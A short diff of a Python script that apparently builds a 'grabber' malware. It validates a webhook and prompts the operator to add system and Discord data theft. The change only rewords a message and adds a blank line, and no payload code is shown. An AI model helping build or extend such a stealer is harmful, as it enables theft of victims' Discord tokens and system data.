@@ -1434,9 +1434,10 @@ try:
     if response.status_code != 200:
        ErrorWebhook()
     else:
-        print(f"{color.RED}{INFO} Valid Webhook.")
+        print(f"{color.RED}{INFO} Webhook Valid.")
 except:
    ErrorWebhook()
+   
 print(f"{color.RED}\n{INFO} Custom your grabber:")
 add_system = input(f"{color.RED}{INPUT} Add System Grab ? (y/n) -> {color.RESET}")
 add_discord = input(f"{color.RED}{INPUT} Add Discord Grab ? (y/n) -> {color.RESET}")
